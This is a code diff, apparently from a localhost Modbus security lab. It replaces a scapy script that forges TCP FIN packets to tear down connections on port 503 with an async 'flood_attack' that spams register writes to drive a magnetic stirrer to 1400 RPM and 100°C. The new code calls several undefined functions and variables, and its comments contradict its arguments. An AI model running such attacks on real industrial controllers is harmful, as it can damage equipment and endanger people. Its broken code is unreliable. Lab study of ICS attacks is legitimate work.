@@ -1,28 +1,32 @@
-from scapy.all import sniff, IP, TCP, send
-
-# Funzione per sniffare il pacchetto SYN e ottenere il numero di sequenza
-def packet_callback(packet):
-    if packet.haslayer(TCP) and packet[TCP].flags == "S":  # Connessione SYN
-        seq_num = packet[TCP].seq
-        print(f"Numero di sequenza iniziale (SYN): {seq_num}")
-        
-        # Dopo aver ottenuto il numero di sequenza, invia un pacchetto FIN
-        send_fin_packet('localhost', packet[TCP].sport, seq_num)
-
-# Funzione per inviare un pacchetto TCP con il flag FIN
-def send_fin_packet(ip, port, seq_num):
-    """
-    Invia un pacchetto TCP con il flag FIN per terminare la connessione con il server.
-    :param ip: Indirizzo IP del server (es. '127.0.0.1')
-    :param port: Porta del server Modbus (es. 503)
-    :param seq_num: Numero di sequenza ottenuto dallo sniffing
-    """
-    # Crea il pacchetto IP e TCP con il flag FIN
-    fin_packet = IP(src="127.0.0.1", dst=ip) / TCP(sport=port, dport=503, flags="F", seq=seq_num)
+from pymodbus.client import AsyncModbusTcpClient
+import asyncio
+async def flood_attack():
     
-    # Invia il pacchetto
-    send(fin_packet)
-    print(f"[+] Pacchetto FIN inviato a {ip}:{port} con numero di sequenza {seq_num} per terminare la connessione.")
+    # Crea il client Modbus asincrono
+    client = AsyncModbusTcpClient("localhost", port=503, trace_packet=packet_logger)
 
-# Sniffing dei pacchetti sulla porta 503 per ottenere il numero di sequenza
-sniff(iface="Software Loopback Interface 1", prn=packet_callback, filter="tcp port 503")
+    # Connetti il client
+    await client.connect()
+
+    # Leggi i dati dallo slave 1
+    print("Writing coils")
+    await read_slave_data(client, slave_id=1)
+    print("Slave 1 Data:", slave_1_data)
+
+    # Leggi i dati dallo slave 2
+    print("Reading data from Slave 2...")
+    slave_2_data = await read_slave_data(client, slave_id=2)
+    print("Slave 2 Data:", slave_2_data)
+
+
+if __name__ == '__main__':
+    # Modbus Server IP finden
+    modbus_ip = "localhost"
+
+    # Für 10 Sekunden beginnend ab dem ersten Register, die Werte 1, 1400 und 100 setzen
+    # (Magnetrührer starten, 1400 RPM und Temperatur auf 100°C stellen)
+    spam_modbus_register_values(modbus_ip=modbus_ip, seconds=10, register=0, register_values=[1, 1400, 100])
+
+    # Für 5 Sekunden auf dem ersten Register den Wert 0 setzen
+    # (Magnetrührer stoppen)
+    spam_modbus_register_values(modbus_ip=modbus_ip, seconds=1, register=0, register_values=[0])
